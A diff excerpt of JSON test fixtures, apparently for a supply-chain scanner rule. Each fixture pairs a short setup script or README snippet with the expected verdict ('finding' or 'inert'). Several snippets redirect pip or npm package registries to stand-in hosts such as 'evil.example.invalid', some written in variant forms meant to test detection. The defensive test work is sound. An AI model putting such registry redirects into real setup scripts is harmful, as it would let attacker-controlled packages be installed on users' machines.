+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip install --extra-index-url https://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-dab4dccfc09a",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n# npm config set registry https://packages.example.invalid\necho hi\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-dea727af8cd8",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncommand npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-df9215ffb734",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm run build -- --registry=https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-e0813e25d533",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config unset global.index-url\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-e1658ab1ddc3",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "README.md": "# d\n```python\nx = \"npm config set registry https://packages.example.invalid/\"\n```\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-e193d528d904",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nenv FOO=bar npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-e39ed8a577da",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncd /tmp &&\n  npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-e3a6b1c29a01",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nif [ -f package.json ]; then\n  npm config set registry https://packages.example.invalid\nfi\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-e58f045aaeda",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n```bash\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-eae4d42b1ee5",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<A <<B\nfrom-a\nA\nregistry=https://packages.example.invalid\nB\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 5
+        }
+      ]
+    },
+    {
+      "id": "control-executable-ec5107986bc5",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat - > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-f5aaaf82b8a7",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn why lodash --registry=https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-f85110908e60",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "README.md": "# Setup\n```text\npip config set global.index-url https://evil.example.invalid/simple\n```\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-f8fdeea1d816",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /dev/null <<A\nnoise\nA\ncat > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 6
         }
       ]
     }
